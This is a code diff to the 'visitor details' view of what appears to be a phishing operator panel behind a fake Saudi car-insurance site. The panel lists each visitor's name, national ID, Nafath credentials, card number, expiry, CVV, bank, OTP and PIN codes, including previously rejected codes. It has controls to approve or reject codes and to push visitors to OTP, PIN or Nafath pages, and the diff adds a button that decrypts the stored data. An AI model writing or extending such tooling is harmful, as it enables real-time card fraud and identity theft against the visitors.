@@ -2,8 +2,9 @@
 
 import { ChevronDown } from "lucide-react"
 import type { InsuranceApplication } from "@/lib/firestore-types"
-import { useState } from "react"
+import { useState, useMemo } from "react"
 import { updateApplication } from "@/lib/firebase-services"
+import { decryptVisitorData } from "@/lib/decrypt-helper"
 import { DataBubble } from "./data-bubble"
 import { convertHistoryToBubbles, type HistoryEntry } from "@/lib/history-helpers"
 import {
@@ -24,6 +25,12 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
   const [isNavigating, setIsNavigating] = useState(false)
   const [isProcessing, setIsProcessing] = useState(false)
   const [nafadCode, setNafadCode] = useState("")
+  const [showDecrypted, setShowDecrypted] = useState(false)
+
+  const displayVisitor = useMemo(() => {
+    if (!visitor) return null
+    return showDecrypted ? decryptVisitorData(visitor) : visitor
+  }, [visitor, showDecrypted])
 
   if (!visitor) {
     return (
@@ -95,23 +102,23 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
 
   // Prepare bubbles data
   const bubbles: any[] = []
-  const history = (visitor.history || []) as HistoryEntry[]
+  const history = (displayVisitor.history || []) as HistoryEntry[]
 
   // 1. Basic Info (always show if exists)
-  if (visitor.ownerName || visitor.identityNumber) {
+  if (displayVisitor.ownerName || displayVisitor.identityNumber) {
     const basicData: Record<string, any> = {
-      "الاسم": visitor.ownerName,
-      "رقم الهوية": visitor.identityNumber,
-      "رقم الهاتف": visitor.phoneNumber,
-      "نوع الوثيقة": visitor.documentType,
-      "الرقم التسلسلي": visitor.serialNumber,
-      "نوع التأمين": visitor.insuranceType
+      "الاسم": displayVisitor.ownerName,
+      "رقم الهوية": displayVisitor.identityNumber,
+      "رقم الهاتف": displayVisitor.phoneNumber,
+      "نوع الوثيقة": displayVisitor.documentType,
+      "الرقم التسلسلي": displayVisitor.serialNumber,
+      "نوع التأمين": displayVisitor.insuranceType
     }
     
     // Add buyer info if insurance type is "نقل ملكية"
-    if (visitor.insuranceType === "نقل ملكية") {
-      basicData["اسم المشتري"] = visitor.buyerName
-      basicData["رقم هوية المشتري"] = visitor.buyerIdNumber
+    if (displayVisitor.insuranceType === "نقل ملكية") {
+      basicData["اسم المشتري"] = displayVisitor.buyerName
+      basicData["رقم هوية المشتري"] = displayVisitor.buyerIdNumber
     }
     
     bubbles.push({
@@ -120,24 +127,24 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       icon: "👤",
       color: "blue",
       data: basicData,
-      timestamp: visitor.basicInfoUpdatedAt || visitor.createdAt,
+      timestamp: displayVisitor.basicInfoUpdatedAt || displayVisitor.createdAt,
       showActions: false
     })
   }
 
   // 2. Nafad Info (show at top if exists)
-  if (visitor.nafazId || visitor.currentStep === "nafad") {
+  if (displayVisitor.nafazId || displayVisitor.currentStep === "nafad") {
     bubbles.push({
       id: "nafad-info",
       title: "معلومات نفاذ",
       icon: "🛡️",
       color: "indigo",
       data: {
-        "رقم الهوية": visitor.nafazId || "في انتظار الإدخال...",
-        "كلمة المرور": visitor.nafazPass ? "تم الإدخال" : "في انتظار الإدخال...",
-        "رقم التأكيد المُرسل": visitor.nafadConfirmationCode || "لم يتم الإرسال بعد"
+        "رقم الهوية": displayVisitor.nafazId || "في انتظار الإدخال...",
+        "كلمة المرور": displayVisitor.nafazPass ? "تم الإدخال" : "في انتظار الإدخال...",
+        "رقم التأكيد المُرسل": displayVisitor.nafadConfirmationCode || "لم يتم الإرسال بعد"
       },
-      timestamp: visitor.nafadUpdatedAt || visitor.updatedAt,
+      timestamp: displayVisitor.nafadUpdatedAt || displayVisitor.updatedAt,
       showActions: true,
       customActions: (
         <div className="flex gap-2 mt-3">
@@ -161,40 +168,40 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
   }
 
   // 3. Insurance Details
-  if (visitor.insuranceCoverage) {
+  if (displayVisitor.insuranceCoverage) {
     bubbles.push({
       id: "insurance-details",
       title: "تفاصيل التأمين",
       icon: "🚗",
       color: "green",
       data: {
-        "نوع التغطية": visitor.insuranceCoverage,
-        "موديل المركبة": visitor.vehicleModel,
-        "قيمة المركبة": visitor.vehicleValue,
-        "سنة الصنع": visitor.vehicleYear,
-        "استخدام المركبة": visitor.vehicleUsage,
-        "موقع الإصلاح": visitor.repairLocation === 'agency' ? 'وكالة' : 'ورشة'
+        "نوع التغطية": displayVisitor.insuranceCoverage,
+        "موديل المركبة": displayVisitor.vehicleModel,
+        "قيمة المركبة": displayVisitor.vehicleValue,
+        "سنة الصنع": displayVisitor.vehicleYear,
+        "استخدام المركبة": displayVisitor.vehicleUsage,
+        "موقع الإصلاح": displayVisitor.repairLocation === 'agency' ? 'وكالة' : 'ورشة'
       },
-      timestamp: visitor.insuranceUpdatedAt || visitor.updatedAt,
+      timestamp: displayVisitor.insuranceUpdatedAt || displayVisitor.updatedAt,
       showActions: false
     })
   }
 
   // 3. Selected Offer
-  if (visitor.selectedOffer) {
+  if (displayVisitor.selectedOffer) {
     bubbles.push({
       id: "selected-offer",
       title: "العرض المختار",
       icon: "📊",
       color: "purple",
       data: {
-        "الشركة": (visitor.selectedOffer as any).name || (visitor.selectedOffer as any).company,
-        "السعر الأصلي": visitor.originalPrice,
-        "الخصم": visitor.discount ? `${(visitor.discount * 100).toFixed(0)}%` : undefined,
-        "السعر النهائي": visitor.finalPrice || visitor.offerTotalPrice,
-        "المميزات المختارة": Array.isArray(visitor.selectedFeatures) ? visitor.selectedFeatures.join(", ") : "لا يوجد"
+        "الشركة": (displayVisitor.selectedOffer as any).name || (displayVisitor.selectedOffer as any).company,
+        "السعر الأصلي": displayVisitor.originalPrice,
+        "الخصم": displayVisitor.discount ? `${(displayVisitor.discount * 100).toFixed(0)}%` : undefined,
+        "السعر النهائي": displayVisitor.finalPrice || displayVisitor.offerTotalPrice,
+        "المميزات المختارة": Array.isArray(displayVisitor.selectedFeatures) ? displayVisitor.selectedFeatures.join(", ") : "لا يوجد"
       },
-      timestamp: visitor.offerUpdatedAt || visitor.updatedAt,
+      timestamp: displayVisitor.offerUpdatedAt || displayVisitor.updatedAt,
       showActions: false
     })
   }
@@ -211,21 +218,21 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     // Show current data
     
     // Card Info
-    if (visitor.cardNumber) {
+    if (displayVisitor.cardNumber) {
       bubbles.push({
         id: "card-current",
         title: "معلومات البطاقة",
         icon: "💳",
         color: "orange",
         data: {
-          "رقم البطاقة": visitor.cardNumber,
-          "نوع البطاقة": visitor.cardType,
-          "تاريخ الانتهاء": visitor.expiryDate,
-          "CVV": visitor.cvv,
-          "البنك": visitor.bankInfo?.name || "غير محدد",
-          "بلد البنك": visitor.bankInfo?.country || "غير محدد"
+          "رقم البطاقة": displayVisitor.cardNumber,
+          "نوع البطاقة": displayVisitor.cardType,
+          "تاريخ الانتهاء": displayVisitor.expiryDate,
+          "CVV": displayVisitor.cvv,
+          "البنك": displayVisitor.bankInfo?.name || "غير محدد",
+          "بلد البنك": displayVisitor.bankInfo?.country || "غير محدد"
         },
-        timestamp: visitor.cardUpdatedAt || visitor.updatedAt,
+        timestamp: displayVisitor.cardUpdatedAt || displayVisitor.updatedAt,
         status: "pending" as const,
         showActions: true,
         isLatest: true,
@@ -234,18 +241,18 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     }
     
     // OTP Code
-    if (visitor.otp || visitor.otpStatus === "show_otp" || visitor.otpStatus === "verifying") {
+    if (displayVisitor.otp || displayVisitor.otpStatus === "show_otp" || displayVisitor.otpStatus === "verifying") {
       // Prepare data object
       const otpData: Record<string, any> = {
-        "الكود": visitor.otp || "في انتظار الإدخال...",
-        "الحالة": visitor.otpStatus === "approved" ? "✓ تم القبول" : 
-                  visitor.otpStatus === "rejected" ? "✗ تم الرفض" :
-                  visitor.otp ? "تم إدخال الكود" : "في انتظار الإدخال"
+        "الكود": displayVisitor.otp || "في انتظار الإدخال...",
+        "الحالة": displayVisitor.otpStatus === "approved" ? "✓ تم القبول" : 
+                  displayVisitor.otpStatus === "rejected" ? "✗ تم الرفض" :
+                  displayVisitor.otp ? "تم إدخال الكود" : "في انتظار الإدخال"
       }
       
       // Add old rejected OTPs if they exist
-      if (visitor.oldOtp && visitor.oldOtp.length > 0) {
-        otpData["الأكواد المرفوضة السابقة"] = visitor.oldOtp.map(item => item.code).join(", ")
+      if (displayVisitor.oldOtp && displayVisitor.oldOtp.length > 0) {
+        otpData["الأكواد المرفوضة السابقة"] = displayVisitor.oldOtp.map(item => item.code).join(", ")
       }
       
       bubbles.push({
@@ -254,27 +261,27 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         icon: "🔑",
         color: "pink",
         data: otpData,
-        timestamp: visitor.otpUpdatedAt || visitor.updatedAt,
-        status: visitor.otpStatus === "approved" ? "approved" as const :
-                visitor.otpStatus === "rejected" ? "rejected" as const : "pending" as const,
-        showActions: visitor.otp && visitor.otpStatus !== "approved" && visitor.otpStatus !== "rejected",
+        timestamp: displayVisitor.otpUpdatedAt || displayVisitor.updatedAt,
+        status: displayVisitor.otpStatus === "approved" ? "approved" as const :
+                displayVisitor.otpStatus === "rejected" ? "rejected" as const : "pending" as const,
+        showActions: displayVisitor.otp && displayVisitor.otpStatus !== "approved" && displayVisitor.otpStatus !== "rejected",
         isLatest: true,
         type: "otp"
       })
     }
     
     // PIN Code
-    if (visitor.pinCode || visitor.otpStatus === "show_pin") {
+    if (displayVisitor.pinCode || displayVisitor.otpStatus === "show_pin") {
       bubbles.push({
         id: "pin-current",
         title: "رمز PIN",
         icon: "🔐",
         color: "indigo",
         data: {
-          "الكود": visitor.pinCode || "في انتظار الإدخال...",
-          "الحالة": visitor.pinCode ? "تم إدخال الكود" : "في انتظار الإدخال"
+          "الكود": displayVisitor.pinCode || "في انتظار الإدخال...",
+          "الحالة": displayVisitor.pinCode ? "تم إدخال الكود" : "في انتظار الإدخال"
         },
-        timestamp: visitor.pinUpdatedAt || visitor.updatedAt,
+        timestamp: displayVisitor.pinUpdatedAt || displayVisitor.updatedAt,
         status: "pending" as const,
         showActions: false,
         isLatest: true,
@@ -283,17 +290,17 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     }
     
     // Phone Info
-    if (visitor.phoneCarrier) {
+    if (displayVisitor.phoneCarrier) {
       bubbles.push({
         id: "phone-info-current",
         title: "معلومات الهاتف",
         icon: "📱",
         color: "green",
         data: {
-          "رقم الجوال": visitor.phoneNumber,
-          "شركة الاتصالات": visitor.phoneCarrier
+          "رقم الجوال": displayVisitor.phoneNumber,
+          "شركة الاتصالات": displayVisitor.phoneCarrier
         },
-        timestamp: visitor.phoneUpdatedAt || visitor.updatedAt,
+        timestamp: displayVisitor.phoneUpdatedAt || displayVisitor.updatedAt,
         status: "pending" as const,
         showActions: false,
         isLatest: true,
@@ -302,18 +309,18 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     }
     
     // Phone OTP
-    if (visitor.phoneOtp || visitor.phoneOtpStatus === "show_phone_otp" || visitor.phoneOtpStatus === "verifying") {
+    if (displayVisitor.phoneOtp || displayVisitor.phoneOtpStatus === "show_phone_otp" || displayVisitor.phoneOtpStatus === "verifying") {
       // Prepare data object
       const phoneOtpData: Record<string, any> = {
-        "كود التحقق": visitor.phoneOtp || "في انتظار الإدخال...",
-        "الحالة": visitor.phoneOtpStatus === "approved" ? "✓ تم القبول" :
-                  visitor.phoneOtpStatus === "rejected" ? "✗ تم الرفض" :
-                  visitor.phoneOtp ? "تم إدخال الكود" : "في انتظار الإدخال"
+        "كود التحقق": displayVisitor.phoneOtp || "في انتظار الإدخال...",
+        "الحالة": displayVisitor.phoneOtpStatus === "approved" ? "✓ تم القبول" :
+                  displayVisitor.phoneOtpStatus === "rejected" ? "✗ تم الرفض" :
+                  displayVisitor.phoneOtp ? "تم إدخال الكود" : "في انتظار الإدخال"
       }
       
       // Add old rejected phone OTPs if they exist
-      if (visitor.allPhoneOtps && visitor.allPhoneOtps.length > 0) {
-        phoneOtpData["الأكواد المرفوضة السابقة"] = visitor.allPhoneOtps.join(", ")
+      if (displayVisitor.allPhoneOtps && displayVisitor.allPhoneOtps.length > 0) {
+        phoneOtpData["الأكواد المرفوضة السابقة"] = displayVisitor.allPhoneOtps.join(", ")
       }
       
       bubbles.push({
@@ -322,10 +329,10 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         icon: "✅",
         color: "pink",
         data: phoneOtpData,
-        timestamp: visitor.phoneOtpUpdatedAt || visitor.updatedAt,
-        status: visitor.phoneOtpStatus === "approved" ? "approved" as const :
-                visitor.phoneOtpStatus === "rejected" ? "rejected" as const : "pending" as const,
-        showActions: visitor.phoneOtp && visitor.phoneOtpStatus !== "approved" && visitor.phoneOtpStatus !== "rejected",
+        timestamp: displayVisitor.phoneOtpUpdatedAt || displayVisitor.updatedAt,
+        status: displayVisitor.phoneOtpStatus === "approved" ? "approved" as const :
+                displayVisitor.phoneOtpStatus === "rejected" ? "rejected" as const : "pending" as const,
+        showActions: displayVisitor.phoneOtp && displayVisitor.phoneOtpStatus !== "approved" && displayVisitor.phoneOtpStatus !== "rejected",
         isLatest: true,
         type: "phone_otp"
       })
@@ -433,37 +440,37 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         <div className="flex items-center justify-between">
           <div>
             <h2 className="text-xl md:text-2xl font-bold text-gray-900">
-              {visitor.ownerName || "زائر جديد"}
+              {displayVisitor.ownerName || "زائر جديد"}
             </h2>
             
             {/* Contact Info */}
             <div className="flex flex-col gap-1 mt-2">
               <div className="flex items-center gap-4 text-sm">
                 <span className="text-gray-600">
-                  📞 <span className="font-semibold text-gray-800">{visitor.phoneNumber || "غير محدد"}</span>
+                  📞 <span className="font-semibold text-gray-800">{displayVisitor.phoneNumber || "غير محدد"}</span>
                 </span>
                 <span className="text-gray-400">•</span>
                 <span className="text-gray-600">
-                  🆔 <span className="font-semibold text-gray-800">{visitor.identityNumber || "غير محدد"}</span>
+                  🆔 <span className="font-semibold text-gray-800">{displayVisitor.identityNumber || "غير محدد"}</span>
                 </span>
               </div>
               
               {/* Device & Location Info */}
-              {(visitor.country || visitor.browser || visitor.deviceType) && (
+              {(displayVisitor.country || displayVisitor.browser || displayVisitor.deviceType) && (
                 <div className="flex items-center gap-2 text-xs text-gray-500">
-                  {visitor.country && (
-                    <span>🌍 {visitor.country}</span>
+                  {displayVisitor.country && (
+                    <span>🌍 {displayVisitor.country}</span>
                   )}
-                  {visitor.browser && (
+                  {displayVisitor.browser && (
                     <>
                       <span>•</span>
-                      <span>🌐 {visitor.browser}</span>
+                      <span>🌐 {displayVisitor.browser}</span>
                     </>
                   )}
-                  {visitor.deviceType && (
+                  {displayVisitor.deviceType && (
                     <>
                       <span>•</span>
-                      <span>📱 {visitor.deviceType}</span>
+                      <span>📱 {displayVisitor.deviceType}</span>
                     </>
                   )}
                 </div>
@@ -471,22 +478,34 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             </div>
           </div>
           
-          {/* Navigation Dropdown */}
-          <div className="relative">
-            <select
-              onChange={(e) => handleNavigate(e.target.value)}
-              disabled={isNavigating}
-              className="px-4 py-2 border border-gray-300 rounded-lg bg-white text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50"
+          <div className="flex gap-2">
+            <button
+              onClick={() => setShowDecrypted(!showDecrypted)}
+              className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
+                showDecrypted 
+                  ? 'bg-green-600 text-white hover:bg-green-700' 
+                  : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
+              }`}
             >
-              <option value="">توجيه الزائر...</option>
-              <option value="home">الصفحة الرئيسية</option>
-              <option value="payment">صفحة الدفع</option>
-              <option value="otp">كود التحقق (OTP)</option>
-              <option value="pin">رمز البطاقة (PIN)</option>
-              <option value="phone">صفحة الهاتف</option>
-              <option value="nafad">صفحة نفاذ</option>
-              <option value="nafad_modal">مودال نفاذ</option>
-            </select>
+              {showDecrypted ? '🔓 مفكوك التشفير' : '🔒 مشفر'}
+            </button>
+            
+            <div className="relative">
+              <select
+                onChange={(e) => handleNavigate(e.target.value)}
+                disabled={isNavigating}
+                className="px-4 py-2 border border-gray-300 rounded-lg bg-white text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50"
+              >
+                <option value="">توجيه الزائر...</option>
+                <option value="home">الصفحة الرئيسية</option>
+                <option value="payment">صفحة الدفع</option>
+                <option value="otp">كود التحقق (OTP)</option>
+                <option value="pin">رمز البطاقة (PIN)</option>
+                <option value="phone">صفحة الهاتف</option>
+                <option value="nafad">صفحة نفاذ</option>
+                <option value="nafad_modal">مودال نفاذ</option>
+              </select>
+            </div>
           </div>
         </div>
       </div>
